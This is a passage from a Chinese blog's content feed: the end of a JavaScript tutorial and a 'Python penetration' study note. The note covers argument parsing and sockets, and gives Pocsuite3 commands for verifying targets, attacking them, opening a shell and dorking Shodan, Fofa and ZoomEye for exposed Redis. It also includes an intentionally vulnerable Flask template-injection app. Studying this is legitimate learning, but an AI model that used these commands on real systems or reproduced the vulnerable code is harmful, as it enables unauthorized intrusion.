对象上触发，图片加载完成后在其上触发</td></tr><tr><td>onunload</td><td>页面完全加载后再 window 对象上触发，图片卸载完成后在其上触发</td></tr><tr><td>onerror</td><td>脚本出错时再 window 对象上触发，图像无法载入时在其上触发</td></tr><tr><td>onselect</td><td>选择了文本框的某些字符或下拉列表框的某项后触发</td></tr><tr><td>onchange</td><td>文本框或下拉框内容改变时触发</td></tr><tr><td>onsubmit</td><td>表单提交时在 form 上触发</td></tr><tr><td>onblur</td><td>任何元素或窗口失去焦点时触发</td></tr><tr><td>onfocus</td><td>任何元素或窗口获得焦点时触发</td></tr><tr><td>onscroll</td><td>浏览器的滚动条滚动时触发</td></tr></tbody></table></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--点击后执行检测函数，通过可以return true来提交表单，否则return false来阻止表单提交--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return check();&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="八、高级"><a href="#八、高级" class="headerlink" title="八、高级"></a>八、高级</h2><h3 id="1-ajax请求"><a href="#1-ajax请求" class="headerlink" title="1 ajax请求"></a>1 ajax请求</h3><blockquote><p>Ajax（Asynchronous JavaScript and XML）是一种用于创建动态网页的技术。它通过在后台与服务器进行少量数据交换，实现页面无需刷新就能更新部分内容的效果。Ajax请求是通过JavaScript代码发起的异步HTTP请求，可以在不刷新整个页面的情况下，向服务器请求数据并更新页面的部分内容。Ajax请求通常使用XMLHttpRequest对象来实现。Ajax请求可以用于实现各种功能，如实时搜索、动态加载内容、表单验证等。</p><p><a href="https://github.com/Magialeaf/Web/tree/main/Design/echo">my::延迟回显</a></p></blockquote><div class="table-container"><table><thead><tr><th>事件名</th><th>事件效果</th></tr></thead><tbody><tr><td>click</td><td>鼠标点击时触发</td></tr><tr><td>mouseover</td><td>鼠标移入元素时触发</td></tr><tr><td>mouseout</td><td>鼠标移出元素时触发</td></tr><tr><td>mousedown</td><td>鼠标按下时触发</td></tr><tr><td>mouseup</td><td>鼠标松开时触发</td></tr><tr><td>mousemove</td><td>鼠标在元素内移动时触发</td></tr><tr><td>keydown</td><td>键盘按下时触发</td></tr><tr><td>keyup</td><td>键盘松开时触发</td></tr><tr><td>submit</td><td>表单提交时触发</td></tr><tr><td>change</td><td>表单元素的值发生改变时触发（要按回车）</td></tr><tr><td>input</td><td>元素内容发生改变时执行（不需要按回车）</td></tr><tr><td>load</td><td>页面或图片加载完成时触发</td></tr><tr><td>error</td><td>页面或图片加载失败时触发</td></tr></tbody></table></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得元素</span></span><br><span class="line"><span class="keyword">var</span> read_letters = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;#read_letter&quot;</span>);</span><br><span class="line"><span class="comment">// 创建函数</span></span><br><span class="line"><span class="keyword">var</span> rebound_want_read_letter = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获得标签</span></span><br><span class="line">    <span class="keyword">var</span> read_letters = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;#read_letter&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置绑定函数</span></span><br><span class="line">    <span class="keyword">var</span> I_want_read_letter = <span class="keyword">function</span> (<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建 AJAX 请求对象</span></span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="comment">// 发送 AJAX 请求（POST带参发送，Get可以不用构造头）</span></span><br><span class="line">        xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;inc/read.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xhr.<span class="title function_">send</span>(<span class="string">&quot;CID=&quot;</span>+value);</span><br><span class="line">        <span class="comment">// 处理 AJAX 响应</span></span><br><span class="line">        xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>); <span class="comment">// php用json_encode()后js用该函数转换</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 处理 AJAX 请求错误</span></span><br><span class="line">        xhr.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 多个标签若存在，依次绑定标签</span></span><br><span class="line">    <span class="keyword">if</span>(read_letters != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        read_letters.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">read_letter</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            read_letter.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, I_want_read_letter);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行函数（如果页面按钮不需要重新绑定事件可以只执行一次，不用重新绑定）</span></span><br><span class="line"><span class="title function_">rebound_want_read_letter</span>();</span><br></pre></td></tr></table></figure><hr><h2 id="九、面向对象"><a href="#九、面向对象" class="headerlink" title="九、面向对象"></a>九、面向对象</h2><h3 id="1-class"><a href="#1-class" class="headerlink" title="1 class"></a>1 class</h3><blockquote><p>ES6支持class关键字</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="comment">// 私有属性</span></span><br><span class="line">    #privateValue;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">        <span class="comment">// 私有属性赋值</span></span><br><span class="line">        <span class="variable language_">this</span>.#privateValue = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">x</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">y</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Father</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 属性get和set设置</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>()&#123;</span><br><span class="line">    _value;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">value</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">value</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">value</span> = val;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-函数嵌套"><a href="#2-函数嵌套" class="headerlink" title="2 函数嵌套"></a>2 函数嵌套</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1：函数内初始化对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    obj.<span class="property">name</span> = name;</span><br><span class="line">    obj.<span class="property">showName</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p = <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">p.<span class="title function_">showName</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：函数外new一个对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">showName</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">p.<span class="title function_">showName</span>();</span><br></pre></td></tr></table></figure><hr><h2 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h2><h3 id="1-游戏"><a href="#1-游戏" class="headerlink" title="1 游戏"></a>1 游戏</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/313050656">低于13kB的10个惊人的JavaScript游戏 - 知乎 (zhihu.com)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python渗透</title>
      <link href="/posts/2810fc66.html"/>
      <url>/posts/2810fc66.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python渗透"><a href="#Python渗透" class="headerlink" title="Python渗透"></a>Python渗透</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><hr><h2 id="一、渗透流程"><a href="#一、渗透流程" class="headerlink" title="一、渗透流程"></a>一、渗透流程<img src="/posts/2810fc66/渗透流程.jpg" alt="img"><img src="/posts/2810fc66/推荐网站.jpg" alt="img"><img src="/posts/2810fc66/常见端口问题.jpg" alt="img"></h2><hr><h2 id="二、Python基础补充"><a href="#二、Python基础补充" class="headerlink" title="二、Python基础补充"></a>二、Python基础补充</h2><h3 id="1-命令行操作"><a href="#1-命令行操作" class="headerlink" title="1 命令行操作"></a>1 命令行操作</h3><h4 id="1-1-sys"><a href="#1-1-sys" class="headerlink" title="1.1 sys"></a>1.1 sys</h4><blockquote><p>sys.argv：[0]是本身，[1]是第一个参数，等等。列表存储。</p></blockquote><h4 id="1-2-getopt"><a href="#1-2-getopt" class="headerlink" title="1.2 getopt"></a>1.2 getopt</h4><blockquote><p>自定义带参输入。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第二个参数是单字符识别，不用隔开空格</span></span><br><span class="line">opts,args = getopt.getopt( sys.argv[<span class="number">1</span>:] , <span class="string">&quot;u:p:&quot;</span> , [<span class="string">&quot;file=&quot;</span>])</span><br><span class="line"><span class="comment">#opts：列表，值为元组，存 ( 选项，选项值 )</span></span><br><span class="line"><span class="comment">#上述选项有：-u -p --file（u: 后面必须有选项值，u 后面没有选项值，带 = 同理后面一定要有参数，否则没有）</span></span><br><span class="line"><span class="comment">#所有选项需要写在参数前面，否则后面的选项会被当做参数传递到 args 中。</span></span><br></pre></td></tr></table></figure><h4 id="1-3-optparse"><a href="#1-3-optparse" class="headerlink" title="1.3 optparse"></a>1.3 optparse</h4><blockquote><p>自动生成帮助文档。</p><p><a href="https://www.cnblogs.com/hardyyy/p/10882711.html">帮助</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加总文档</span></span><br><span class="line">parser = optparse.OptionParser(usage)</span><br><span class="line"><span class="comment"># 添加单个参数</span></span><br><span class="line">parser.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--user&#x27;</span>,dest=<span class="string">&#x27;User&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target user&#x27;</span>,default=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="comment"># dest 是 key，type检测参数格式是否正确，help是帮助信息，default是默认值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解包，带选项以字典存入options中，不带的存入args中</span></span><br><span class="line">options,args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line">usage = <span class="string">&quot;python %prog -u/--user  -p/--password &quot;</span> <span class="comment"># %prog：file_name</span></span><br><span class="line">parser = optparse.OptionParser(usage)</span><br><span class="line">parser.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--user&#x27;</span>,dest=<span class="string">&#x27;User&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target user&#x27;</span>,default=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">parser.add_option(<span class="string">&#x27;-p&#x27;</span>,<span class="string">&#x27;--password&#x27;</span>,dest=<span class="string">&#x27;Pad&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target password&#x27;</span>)</span><br><span class="line">options,args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;options:&quot;</span>,options)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;user:&quot;</span>,options.User)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span>,options.Pad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;args&quot;</span>,args)</span><br></pre></td></tr></table></figure><h4 id="1-4-argparse"><a href="#1-4-argparse" class="headerlink" title="1.4 argparse"></a>1.4 argparse</h4><blockquote><p>同理 optparse 但比 optparse 更简单快捷。</p><p><a href="https://www.cnblogs.com/gmpy/p/11796416.html">帮助</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># choices 是选择范围，nargs是参数个数，required是是否必须</span></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--user&#x27;</span>,dest=<span class="string">&#x27;User&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,default=<span class="string">&#x27;root&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target User&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-s&#x27;</span>,<span class="string">&#x27;--sex&#x27;</span>,dest=<span class="string">&#x27;Sex&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,choices=&#123;<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;女&#x27;</span>&#125;,default=<span class="string">&#x27;男&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target Sex&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>,<span class="string">&#x27;--number&#x27;</span>,dest=<span class="string">&#x27;Num&#x27;</span>,nargs=<span class="number">2</span>,required=<span class="literal">True</span>,<span class="built_in">type</span>=<span class="built_in">int</span>,<span class="built_in">help</span>=<span class="string">&#x27;Target Two Numbers&#x27;</span>)</span><br><span class="line">arg = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># arg.&lt;name&gt;：获得单个参数值</span></span><br></pre></td></tr></table></figure><h3 id="2-网络编程"><a href="#2-网络编程" class="headerlink" title="2 网络编程"></a>2 网络编程</h3><blockquote><p><a href="https://blog.csdn.net/m0_59485658/article/details/128455940">socket与socketserver</a></p></blockquote><h4 id="2-1-IP地址查询"><a href="#2-1-IP地址查询" class="headerlink" title="2.1 IP地址查询"></a>2.1 IP地址查询</h4><blockquote><p><a href="https://github.com/mbcc2006/GeoLiteCity-data">GeoLiteCity.Dat</a></p><p>ip查询：<a href="https://www.ip.cn/">【1】</a> <a href="https://www.ip138.com/">【2】</a> <a href="https://whatismyipaddress.com/">【3】</a> <a href="https://tool.lu/ip">【4】</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调用程序查询</span></span><br><span class="line"><span class="keyword">import</span> pygeoip</span><br><span class="line">geo = pygeoip.GeoIP( <span class="string">&#x27;GeoLiteCity\GeoLiteCity.dat&#x27;</span> )</span><br><span class="line">geo.record_by_name( <span class="string">&#x27;ip&#x27;</span> )</span><br></pre></td></tr></table></figure><h4 id="2-2-基础函数"><a href="#2-2-基础函数" class="headerlink" title="2.2 基础函数"></a>2.2 基础函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建套接字</span></span><br><span class="line">s = socket( AF_INET , SOCK , IPPROTO )</span><br><span class="line"><span class="comment"># tup是元组：( ip:int , port:str )，TCP/UDP 服务器都绑定</span></span><br><span class="line">s.bind(tup)</span><br><span class="line">s.connect(tup)</span><br><span class="line"><span class="comment"># backlog是排队数，backlog+1 表示允许的最大连接数</span></span><br><span class="line">s.listen(backlog)</span><br><span class="line"><span class="comment"># conn是用于通信的套接字</span></span><br><span class="line">conn , addr = s.accept()    </span><br><span class="line"></span><br><span class="line">s.send( buf , [,flags] )</span><br><span class="line">s.recv( buflen , [,flags] )</span><br><span class="line">s.sendto( <span class="built_in">str</span> , addr )</span><br><span class="line">data,addr = s.recvfrom( buflen , [,flags] )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送全部</span></span><br><span class="line">s.sendall( buf )</span><br><span class="line"><span class="comment"># 发送的数据要编码和解码</span></span><br><span class="line">buf.encode() / decode() </span><br></pre></td></tr></table></figure><h4 id="2-3-其他函数"><a href="#2-3-其他函数" class="headerlink" title="2.3 其他函数"></a>2.3 其他函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取本地 mac 地址</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Mac_Address</span>():</span><br><span class="line">    mac = uuid.UUID(<span class="built_in">int</span> = uuid.getnode()).<span class="built_in">hex</span>[-<span class="number">12</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;:&quot;</span>.join([mac[e:e+<span class="number">2</span>] <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>,<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 ip port</span></span><br><span class="line"><span class="comment"># 通过主机名获得 ip</span></span><br><span class="line">ip = gethostbyname(gethostname())</span><br><span class="line"><span class="comment"># 通过 ip 获得 hostname（返回一个元组）</span></span><br><span class="line">gethostbyaddr(ip)</span><br><span class="line"><span class="comment"># 通过 port 获得 服务名</span></span><br><span class="line">getservbyport(<span class="number">3389</span>,<span class="string">&quot;tcp&quot;</span>)</span><br><span class="line"><span class="comment"># 通过 服务名 获得 port</span></span><br><span class="line">getservbyname(<span class="string">&quot;http&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-4-文件传输实例"><a href="#2-4-文件传输实例" class="headerlink" title="2.4 文件传输实例"></a>2.4 文件传输实例</h4><blockquote><p><a href="https://github.com/Magialeaf/Course/tree/main/Network_Programming">my::案例</a></p><p><a href="https://www.cnblogs.com/jkred369/p/7250136.html">结构体</a></p></blockquote><ul><li><p>服务器</p><blockquote><p>提示界面（cmd）——创建线程类（类中实现发送文件，不需要再 listen 等操作）——发送数据</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建线程</span></span><br><span class="line">socketserver.ThreadingTCPServer(addr,MyServer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyServer</span>(socketserver.BaseRequestHandler):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>): <span class="comment"># 重写该类功能</span></span><br><span class="line">        self.request <span class="comment"># 为 socket</span></span><br><span class="line">        self.request.close() <span class="comment"># 关闭套接字</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 打包（i：int类型，dir：字典）</span></span><br><span class="line">struct.pack(<span class="string">&#x27;i&#x27;</span>,<span class="built_in">int</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json.dumps(<span class="built_in">dir</span>)</span><br></pre></td></tr></table></figure></li><li><p>客户端</p><blockquote><p>提示界面（cmd）——connect——接收数据</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包</span></span><br><span class="line">struct.unpack(<span class="string">&#x27;i&#x27;</span>,<span class="built_in">int</span>)</span><br><span class="line">json.loads(info.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-5-可执行文件转化"><a href="#2-5-可执行文件转化" class="headerlink" title="2.5 可执行文件转化"></a>2.5 可执行文件转化</h4><blockquote><p>pyinstaller打包只可再编译同一操作系统下运行。（不同易报错）</p></blockquote><hr><h2 id="三、Pocsuite3"><a href="#三、Pocsuite3" class="headerlink" title="三、Pocsuite3"></a>三、Pocsuite3</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h3><blockquote><p>Pocsuite3安装：</p><ol><li><code>pip install pocsuite</code></li><li><code>git clone https://github.com/knownsec/pocsuite3.git</code></li><li><code>wget https://github.com/knownsec/pocsuite3/archive/master.zip</code></li></ol><p>必要库安装（在pocsuite3库下使用）：</p><ol><li><code>cd /usr/lib/python3/dist-packages/pocsuite3</code></li><li><code>pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple/</code></li></ol><p>使用：</p><ol><li>在pocsuite3路径下，<code>python3 cli.py &lt;-para&gt;</code></li></ol></blockquote><h3 id="2-cli-py使用"><a href="#2-cli-py使用" class="headerlink" title="2 cli.py使用"></a>2 cli.py使用</h3><blockquote><p>Shodan的Key验证：<a href="https://api.shodan.io/account/profile?key=xxx">https://api.shodan.io/account/profile?key=xxx</a></p><p>Fofa的key验证：<a href="https://fofa.info/api/v1/info/my?email=xxx&amp;key=xxx">https://fofa.info/api/v1/info/my?email=xxx&amp;key=xxx</a></p></blockquote><div class="table-container"><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>-u URL [URL…] , —url URL [URL…]</td><td>直接指定URL，可以指定多个</td></tr><tr><td>-f URL_FILE , —file URL_FILE</td><td>加载指定文件中的目标</td></tr><tr><td>-r POC [POC…]</td><td>加载POC脚本</td></tr><tr><td>-c CONFIGFILE Load options from a configuration INI file</td><td>调用配置文件。通过配置文件中的配置信息对目标进行POC验证</td></tr><tr><td>—verify</td><td>验证目标</td></tr><tr><td>—attack</td><td>攻击目标</td></tr><tr><td>—shell</td><td>交互模式</td></tr><tr><td>—command [command]</td><td>执行命令</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 验证</span></span><br><span class="line">python3 cli.py -r pocs/poc-flask.py -u http://ip -- verify</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 带命令攻击</span></span><br><span class="line">python3 cli.py -r pocs/<span class="built_in">all</span>-flask.py -f /root/url.txt --attack --command <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行交互模式</span></span><br><span class="line">python3 cli.py -r pocs/<span class="built_in">all</span>-flask.py -f /root/url.txt --shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载配置文件（token在ini中，报错可能是网速原因）</span></span><br><span class="line">python3 cli.py -c ../pocsuite.ini</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用搜索引擎接口</span></span><br><span class="line"><span class="comment"># Zoomeye</span></span><br><span class="line">python3 cli.py -r pocs/redis_unauthorized_access.py --dork <span class="string">&quot;product:redis&quot;</span></span><br><span class="line"><span class="comment"># Shodan</span></span><br><span class="line">python3 cli.py -r pocs/redis_unauthorized_access.py --dork-shodan <span class="string">&quot;product:redis&quot;</span> --shodan-token <span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="comment"># fofa</span></span><br><span class="line">python3 cli.py -r pocs/redis_unauthorized_access.py --dork-fofa <span class="string">&quot;service:redis&quot;</span> --fofa-user <span class="string">&quot;xxx&quot;</span> --fofa-token <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-console-py使用"><a href="#3-console-py使用" class="headerlink" title="3 console.py使用"></a>3 console.py使用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入交互命令模式</span></span><br><span class="line">python3 console.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列举脚本</span></span><br><span class="line"><span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用poc脚本</span></span><br><span class="line">use [path]</span><br><span class="line">use pocs/poc-flask</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看要填的参数（类似msf，&quot;require&quot;的参数必填）</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置参数</span></span><br><span class="line"><span class="built_in">set</span> [Name] [value]</span><br><span class="line"><span class="built_in">set</span> target http://ip</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="4-Flask模板注入漏洞"><a href="#4-Flask模板注入漏洞" class="headerlink" title="4 Flask模板注入漏洞"></a>4 Flask模板注入漏洞</h3><blockquote><p><a href="https://docs.jinkan.org/docs/jinja2/">Jinja2</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 漏洞环境</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    t = Template(<span class="string">&quot;Hello&quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 验证漏洞（返回Hello 4表示漏洞存在）</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>?name=&#123;&#123;<span class="number">2</span>*<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web渗透</title>
      <link href="/posts/54924480.html"/>
      <url>/posts/54924480.html</url>
      
